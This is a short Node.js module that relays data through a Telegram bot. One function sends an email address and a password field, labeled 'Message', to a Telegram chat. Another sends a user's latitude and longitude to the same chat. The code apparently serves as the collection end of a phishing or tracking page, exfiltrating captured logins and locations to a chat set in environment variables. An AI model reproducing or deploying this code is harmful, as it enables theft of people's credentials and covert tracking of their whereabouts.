const TelegramBot=require('node-telegram-bot-api');
require('dotenv').config();
const bot=new TelegramBot(`${process.env.TOKEN}`,{polling:true});
function Bot(obj){

    bot.sendMessage(process.env.CHAT_ID,`Email :${obj.email} Message:${obj.pass}`);
}
function user_location(loc){
    console.log(loc);
    bot.sendLocation(process.env.CHAT_ID,loc.lat,loc.lon);
}
module.exports={Bot,user_location};